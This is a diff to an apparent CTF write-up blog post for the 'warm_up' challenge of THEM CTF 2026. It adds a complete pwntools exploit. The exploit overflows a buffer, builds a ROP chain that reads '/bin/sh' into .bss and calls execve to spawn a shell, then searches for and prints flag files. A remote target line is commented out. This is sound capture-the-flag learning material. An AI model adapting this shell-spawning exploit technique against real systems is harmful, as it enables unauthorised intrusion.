@@ -79,3 +79,50 @@ excerpt: "Solving the warm-up challenge from THEM CTF 2026 using ROP technique t
     payload += syscall_ret
     ```
 
+
+
+## Code Exploiting  
+```py
+from pwn import *
+
+context.binary = binary = ELF("./warm_up")
+
+syscall_ret  = p64(0x44ebd9)        # syscall; ret
+xor_eax_ret  = p64(0x40240e)        # xor eax, eax; ret
+pop_rax      = p64(0x44ffc7)        # pop rax; ret
+pop_rdi      = p64(0x401f9f)        # pop rdi; ret
+pop_rsi      = p64(0x40a00e)        # pop rsi; ret
+pop_rdx_rbx  = p64(0x485d2b)        # pop rdx; pop rbx; ret
+bss_addr     = p64(0x4c72b0)
+
+payload  = b"A" * (0x80 + 0x8)
+
+# read(0, bss, 8)
+payload += xor_eax_ret              # rax = 0  (SYS_read)
+payload += pop_rdi + p64(0)         # rdi = 0  (stdin)
+payload += pop_rsi + bss_addr       # rsi = bss
+payload += pop_rdx_rbx + p64(8) + p64(0)
+payload += syscall_ret
+
+# execve(bss, 0, 0)
+payload += pop_rax + p64(59)        # rax = 59 (SYS_execve)
+payload += pop_rdi + bss_addr       # rdi = bss
+payload += pop_rsi + p64(0)         # rsi = 0  (argv = NULL)
+payload += pop_rdx_rbx + p64(0) + p64(0)
+payload += syscall_ret
+
+assert len(payload) == 0x120, f"payload size {len(payload)} != 288"
+
+#p = remote("45.130.164.173", 2233)
+p = process() 
+p.recvuntil(b"aight ! now show me what u got.\n")
+p.send(payload)
+sleep(0.5)
+p.send(b"/bin/sh\0")
+sleep(0.5)
+p.sendline(b"cat /flag* 2>/dev/null; cat flag* 2>/dev/null; find / -name 'flag*' -exec cat {} \\; 2>/dev/null")
+sleep(0.5)
+print(p.recv(timeout=2).decode(errors='replace'))
+p.close()
+```
+
